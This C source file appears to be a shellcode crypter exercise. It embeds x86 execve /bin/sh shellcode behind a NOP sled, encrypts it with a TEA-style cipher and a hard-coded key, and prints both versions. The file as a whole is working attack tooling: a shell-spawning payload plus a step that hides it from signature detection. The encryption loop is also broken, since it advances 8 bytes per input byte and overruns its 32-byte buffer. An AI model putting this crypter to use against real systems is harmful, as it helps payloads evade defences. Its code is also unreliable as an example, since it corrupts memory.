#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
//Program: Encrypt.c
//Author: Will Summerhill

/* /bin/sh shellcode from 'execve-stack' program */
unsigned char shellcode[] = \
"\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

//TES encrypt function - encrypt one byte at a time
void encrypt(uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], sum=0, i;
    uint32_t delta=0x9e3779b9;
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];
    for (i=0; i < 32; i++) {
        sum += delta;
        v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
    }
    v[0]=v0; v[1]=v1;
}

//Print shellcode
void printfunction(unsigned char* array, int size) {
	int i = 0;
	for (i; i < size; i++) {
		printf("\\x%02x", array[i]);
	}
	printf("\n");
}

main(int argc, char **argv) {
	
	int size = sizeof(shellcode) - 1;
	unsigned char key[16] = "somerandompasswd"; //128 bit key
	unsigned char* encShell;
	unsigned char* encShellVal;

	encShell = malloc(32);	//allocate memory for "encShell" variable
	//copy shellcode into encShell
	memset(encShell, 0, size);
	memcpy(encShell, shellcode, size);

	printf("Original shellcode:\n");
	printfunction(shellcode, size);
	
	encShellVal = encShell;
	int i = 0;
	for (i; i < size; i++) {
		encrypt((uint32_t *) encShellVal, (uint32_t *) key);
		encShellVal += 8; //continue to next block
	}
	
	printf("\nEncrypted shellcode:\n");
	printfunction(encShell, size);

	return 0;
}
